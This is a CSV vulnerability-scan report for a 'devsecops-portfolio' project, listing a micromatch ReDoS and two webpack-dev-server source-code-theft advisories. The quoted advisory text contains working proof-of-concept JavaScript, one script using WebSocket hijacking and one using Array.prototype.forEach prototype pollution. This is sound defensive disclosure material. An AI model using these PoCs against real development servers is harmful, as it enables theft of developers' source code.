"Project","ScanDate","DependencyName","DependencyPath","Description","License","Md5","Sha1","Identifiers","CPE","CVE","CWE","Vulnerability","Source","CVSSv2_Severity","CVSSv2_Score","CVSSv2","CVSSv3_BaseSeverity","CVSSv3_BaseScore","CVSSv3","CVSSv4_BaseSeverity","CVSSv4_BaseScore","CVSSv4","CPE Confidence","Evidence Count","VendorProject","Product","Name","DateAdded","ShortDescription","RequiredAction","DueDate","Notes"
devsecops-portfolio,"Mon, 6 Oct 2025 08:54:45 GMT",micromatch:4.0.5,/github/workspace/package-lock.json?/micromatch:4.0.5,Glob matching for javascript/node.js. A replacement and faster alternative to minimatch and multimatch.,MIT,"","",pkg:npm/micromatch@4.0.5,cpe:2.3:a:jonschlinkert:micromatch:4.0.5:*:*:*:*:*:*:*,CVE-2024-4067,CWE-1333 Inefficient Regular Expression Complexity,"The NPM package `micromatch` prior to 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persists. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching. This issue was fixed in version 4.0.8.",NVD,"","","",MEDIUM,5.3,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:3.9/RC:R/MAV:A,"","","",HIGHEST,8,"","","","","","","",""
devsecops-portfolio,"Mon, 6 Oct 2025 08:54:45 GMT",webpack-dev-server:4.15.2,/github/workspace/projects/frontend/react-app/package-lock.json?webpack-dev-server,"","","","",pkg:npm/webpack-dev-server@4.15.2,"",GHSA-9jgg-88mc-972h,CWE-346 Origin Validation Error,"### Summary Source code may be stolen when you access a malicious web site with non-Chromium based browser.  ### Details The `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732. But webpack-dev-server always allows IP address `Origin` headers. https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127 This allows websites that are served on IP addresses to connect WebSocket. By using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.  related commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.  This vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).  ### PoC 1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it 2. Run `npm i` 3. Run `npx webpack-dev-server` 4. Open `http://{ipaddress}/?target=http://localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1) 5. Edit `src/index.js` in the extracted directory 6. You can see the content of `src/index.js`  ![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)  The script in the POC site is: ```js window.webpackHotUpdate = (...args) => {     console.log(...args);     for (i in args[1]) {         document.body.innerText = args[1][i].toString() + document.body.innerText 	    console.log(args[1][i])     } }  let params = new URLSearchParams(window.location.search); let target = new URL(params.get('target') || 'http://127.0.0.1:8080'); let file = params.get('file') let wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss'; let wsPort = target.port; var currentHash = ''; var currentHash2 = ''; let wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`; ws = new WebSocket(wsTarget); ws.onmessage = event => {     console.log(event.data);     if (event.data.match('""type"":""ok""')) {         s = document.createElement('script');         s.src = `${target}${file}.${currentHash2}.hot-update.js`;         document.body.appendChild(s)     }     r = event.data.match(/""([0-9a-f]{20})""/);     if (r !== null) {         currentHash2 = currentHash;         currentHash = r[1];         console.log(currentHash, currentHash2);     } } ```  ### Impact This vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.",NPM,"","","",MEDIUM,6.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N,"","","",HIGHEST,3,"","","","","","","",""
devsecops-portfolio,"Mon, 6 Oct 2025 08:54:45 GMT",webpack-dev-server:4.15.2,/github/workspace/projects/frontend/react-app/package-lock.json?webpack-dev-server,"","","","",pkg:npm/webpack-dev-server@4.15.2,"",GHSA-4v9v-hfq4-rm2v,CWE-749 Exposed Dangerous Method or Function,"### Summary Source code may be stolen when you access a malicious web site.  ### Details Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=""http://localhost:8080/main.js"">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables. By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.  ### PoC 1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it 2. Run `npm i` 3. Run `npx webpack-dev-server` 4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/` 5. You can see the source code output in the document and the devtools console.  ![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)  The script in the POC site is: ```js let moduleList const onHandlerSet = (handler) => {   console.log('h', handler)   moduleList = handler.require.m }  const originalArrayForEach = Array.prototype.forEach Array.prototype.forEach = function forEach(callback, thisArg) {   callback((handler) => {     onHandlerSet(handler)   })   originalArrayForEach.call(this, callback, thisArg)   Array.prototype.forEach = originalArrayForEach }  const script = document.createElement('script') script.src = 'http://localhost:8080/main.js' script.addEventListener('load', () => {   console.log(moduleList)   for (const key in moduleList) {     const p = document.createElement('p')     const title = document.createElement('strong')     title.textContent = key     const code = document.createElement('code')     code.textContent = moduleList[key].toString()     p.append(title, ':', document.createElement('br'), code)     document.body.appendChild(p)   } }) document.head.appendChild(script) ```  This script uses the function generated by [`renderRequire`](https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383). ```js     // The require function     function __webpack_require__(moduleId) {         // Check if module is in cache         var cachedModule = __webpack_module_cache__[moduleId];         if (cachedModule !== undefined) {             return cachedModule.exports;         }         // Create a new module (and put it into the cache)         var module = __webpack_module_cache__[moduleId] = {             // no module.id needed             // no module.loaded needed             exports: {}         };         // Execute the module function         var execOptions = {             id: moduleId,             module: module,             factory: __webpack_modules__[moduleId],             require: __webpack_require__         };         __webpack_require__.i.forEach(function(handler) {             handler(execOptions);         });         module = execOptions.module;         execOptions.factory.call(module.exports, module, module.exports, execOptions.require);         // Return the exports of the module         return module.exports;     } ``` Especially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`. It uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.  ### Impact This vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.  <details> <summary>Old content</summary>  ### Summary Source code may be stolen when you use [`output.iife: false`](https://webpack.js.org/configuration/output/#outputiife) and access a malicious web site.  ### Details When `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`). Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=""http://localhost:8080/main.js"">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object. By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.  I pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.  ### PoC 1. Download [reproduction.zip](https://github.com/user-attachments/files/18409777/reproduction.zip) and extract it 2. Run `npm i` 3. Run `npx webpack-dev-server` 4. Open `https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/` 5. Open the devtools console. 6. You can see the content of `src/index.js` and other scripts loaded.  ![image](https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436)  The script in the POC site is: ```js const script = document.createElement('script') script.src = 'http://localhost:8080/main.js' script.addEventListener('load', () => {     for (const module in window.__webpack_modules__) {         console.log(`${module}:`, window.__webpack_modules__[module].toString())     } }) document.head.appendChild(script) ```  ### Impact This vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.  </details>",NPM,"","","",MEDIUM,5.300000190734863,CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N,"","","",HIGHEST,3,"","","","","","","",""
